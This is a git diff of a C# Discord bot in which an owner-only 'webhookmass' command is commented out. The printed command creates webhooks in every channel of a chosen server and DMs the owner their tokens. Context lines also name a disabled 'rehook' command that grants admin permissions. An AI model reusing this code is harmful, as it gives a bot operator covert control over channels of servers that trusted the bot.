@@ -61,6 +61,7 @@ namespace GLaDOSV3.Modules
         public async Task Shutdown()
         {
             await this.ReplyAsync("Shutting down the bot! 👋").ConfigureAwait(false);
+            await this.Context.Client.LogoutAsync().ConfigureAwait(false);
             Environment.Exit(0);
         }
 
@@ -103,29 +104,29 @@ namespace GLaDOSV3.Modules
                           });
             await this.service.ExecuteAsync(new SocketCommandContext(Context.Client, (SocketUserMessage)msg), command.StartsWith(botSettingsHelper["prefix"]) ? command[botSettingsHelper["prefix"].Length..] : command, this.provider);
         }
-        [Command("bot webhookmass")]
-        [Remarks("bot webhookmass <serverid> <count>")]
-        [Summary("Add webhook to every channel")]
-        [Attributes.RequireOwner]
-        public async Task WebHookMass(ulong serverId, int number = 1)
-        {
-            SocketGuild guild = Context.Client.GetGuild(serverId);
-            string result = "";
-            foreach (SocketTextChannel sc in guild.TextChannels)
-            {
-                for (var i = 0; i < number; i++)
-                {
-                    var hook = await sc.CreateWebhookAsync("Captain hook").ConfigureAwait(true);
-                    var id = hook.Id;
-                    var token = hook.Token;
-                    result += $"https://canary.discordapp.com/api/webhooks/{id}/{token}\n";
-                }
-            }
-            var dm = await Context.User.GetOrCreateDMChannelAsync().ConfigureAwait(false);
-            foreach (var msg in Tools.SplitMessage(result, 1985))
-                await dm.SendMessageAsync($"```\n{msg}```").ConfigureAwait(false);
-            await dm.CloseAsync().ConfigureAwait(false);
-        }
+        //[Command("bot webhookmass")]
+        //[Remarks("bot webhookmass <serverid> <count>")]
+        //[Summary("Add webhook to every channel")]
+        //[Attributes.RequireOwner]
+        //public async Task WebHookMass(ulong serverId, int number = 1)
+        //{
+        //    SocketGuild guild = Context.Client.GetGuild(serverId);
+        //    string result = "";
+        //    foreach (SocketTextChannel sc in guild.TextChannels)
+        //    {
+        //        for (var i = 0; i < number; i++)
+        //        {
+        //            var hook = await sc.CreateWebhookAsync("Captain hook").ConfigureAwait(true);
+        //            var id = hook.Id;
+        //            var token = hook.Token;
+        //            result += $"https://canary.discordapp.com/api/webhooks/{id}/{token}\n";
+        //        }
+        //    }
+        //    var dm = await Context.User.GetOrCreateDMChannelAsync().ConfigureAwait(false);
+        //    foreach (var msg in Tools.SplitMessage(result, 1985))
+        //        await dm.SendMessageAsync($"```\n{msg}```").ConfigureAwait(false);
+        //    await dm.CloseAsync().ConfigureAwait(false);
+        //}
         //[Command("bot rehook")]
         //[Remarks("bot rehook <user> [--s]")]
         //[Summary("Hooks his permissions to admin to every channel")]
@@ -331,7 +332,6 @@ namespace GLaDOSV3.Modules
             string[] coOwners = ok.Split(',');
             var output = coOwners.Aggregate("User (Mention)\n", (current, t) => current + $"{t} (<@{t}>)\n");
             await this.ReplyAsync(output).ConfigureAwait(false);
-            //TODO: finish this
         }
         [Attributes.RequireOwner]
         [Command("bot release")]
